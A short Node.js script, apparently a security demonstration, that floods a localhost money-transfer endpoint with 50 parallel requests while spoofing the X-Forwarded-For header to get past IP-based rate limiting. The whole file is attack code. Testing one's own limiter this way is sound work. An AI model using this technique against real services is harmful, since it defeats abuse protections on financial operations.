// Rate Limit Bypass Simulation
// Basic rate limit tied to IP = useless
// Attackers rotate IPs easily
// Your limiter might just be decoration

const axios = require("axios");

const URL = "http://localhost:3000/transfer";

async function attack() {
  const requests = [];

  for (let i = 0; i < 50; i++) {
    requests.push(
      axios.post(URL, { amount: 10 }, {
        headers: {
          Authorization: "Bearer valid-token",
          "X-Forwarded-For": "192.168.1." + i // fake IP rotation
        }
      })
    );
  }

  await Promise.allSettled(requests);

  console.log("Attack finished");
}

attack();
